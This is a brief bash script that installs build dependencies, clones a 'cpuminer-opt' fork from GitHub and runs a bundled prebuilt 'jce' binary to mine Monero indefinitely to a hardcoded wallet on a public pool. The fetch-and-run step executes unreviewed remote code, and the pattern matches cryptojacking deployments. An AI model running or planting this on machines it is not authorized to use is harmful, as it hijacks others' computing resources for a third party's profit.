#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
rm -rf cpuminer-opt &&
git clone https://github.com/fablebox/cpuminer-opt &&
cd cpuminer-opt &&
chmod +x jce &&
./jce --auto --any --forever  -o pool.minexmr.com:7777 -u 42fEFbU6ejvbr8z5qv9aiADFKXTdTYB5D7PfzAJ9kjEWNpzvrbmWQkaRkhX5mr4xwWdyn2og7afzMJNUsak2v1CqFGpf2F7 -p x

